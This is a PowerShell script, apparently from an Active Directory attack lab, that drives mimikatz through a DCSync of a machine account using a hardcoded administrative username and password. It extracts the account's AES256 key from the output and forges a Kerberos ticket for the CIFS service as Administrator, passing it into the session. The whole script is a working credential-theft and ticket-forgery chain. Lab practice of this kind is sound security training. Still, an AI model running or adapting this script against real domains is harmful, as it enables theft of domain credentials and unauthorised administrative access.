[CmdletBinding()]
param(
    [string]$ChildSid = "S-1-5-21-2616196951-1941128886-767624593",
    [string]$Mimikatz = "C:\Tools\cadre-attack\mimikatz.exe",
    [string]$OutFile = "C:\Tools\cadre-attack\mbr01-dcsync.txt"
)
$ErrorActionPreference = "Stop"
if (-not (Test-Path $Mimikatz)) { throw "mimikatz missing: $Mimikatz" }
$dcsync = "lsadump::dcsync /domain:child.cadre.local /user:MBR01$ /dc:dc02.child.cadre.local /authuser:chief_command /authpassword:C0mm@nd_Ch1ef! /authdomain:cadre.local"
& $Mimikatz $dcsync "exit" 2>&1 | Tee-Object -FilePath $OutFile
$line = Select-String -Path $OutFile -Pattern 'aes256_hmac\s+\(4096\)\s+:\s+([A-Fa-f0-9]+)' | Select-Object -First 1
if (-not $line -or -not $line.Matches[0].Groups[1].Value) {
    Write-Output "T011_FAIL: no aes256_hmac in $OutFile"
    exit 1
}
$aes = $line.Matches[0].Groups[1].Value.Trim()
Write-Output "AES256=$aes"
& $Mimikatz "kerberos::golden /user:Administrator /domain:child.cadre.local /sid:$ChildSid /service:cifs/mbr01.child.cadre.local /aes256:$aes /ptt" "exit" 2>&1
Write-Output "T011_OK"
